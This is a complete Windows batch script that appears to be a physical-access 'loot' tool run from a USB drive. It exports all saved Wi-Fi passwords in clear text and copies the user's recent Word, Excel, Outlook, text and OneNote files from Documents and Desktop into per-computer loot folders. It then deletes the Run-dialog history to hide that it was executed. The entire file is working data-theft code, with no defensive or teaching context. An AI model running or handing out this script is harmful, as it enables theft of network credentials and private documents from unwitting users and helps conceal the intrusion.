@echo off
cd /d %~dp0
mkdir \loot\WiFiCreds\%COMPUTERNAME%
cd \loot\WiFiCreds\%COMPUTERNAME%
netsh wlan export profile key=clear
timeout 1
mkdir \loot\DriveLast30\%COMPUTERNAME%
cd \loot\DriveLast30\%COMPUTERNAME%
robocopy %userprofile%\Documents\ . *.doc* *.xls* *.msg *.txt *.one /S /J /MT /MAXAGE:30 /MAX:4000000 /R:0 /np /nfl
robocopy %userprofile%\Desktop\ . *.doc* *.xls* *.msg *.txt *.one /S /J /MT /MAXAGE:30 /MAX:4000000 /R:0 /np /nfl

REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
timeout 1
exit